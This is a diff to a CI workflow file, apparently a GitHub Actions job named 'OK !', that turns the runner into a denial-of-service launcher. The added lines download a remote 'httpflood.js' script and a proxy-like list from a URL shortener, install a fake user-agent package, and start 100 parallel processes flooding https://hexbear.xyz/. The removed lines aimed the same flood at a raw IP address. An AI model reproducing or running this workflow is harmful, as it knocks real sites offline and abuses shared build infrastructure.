@@ -15,13 +15,13 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/JrQJv/flood.js
-          wget https://curl.by/xX7o1/fres.txt
+          wget https://curl.by/NPJJ7/httpflood.js
+          wget https://curl.by/UYgdD/fres.txt
           npm install fake-useragent colors
-          chmod +x flood.js
+          chmod +x httpflood.js
           PIDS=()
           for i in {1..100}; do
-            timeout 85 node flood.js GET http://45.141.150.78/ fres.txt 83 90 12
+            timeout 85 node httpflood.js GET https://hexbear.xyz/ fres.txt 83 90 12
             PIDS+=($!)
           done
           
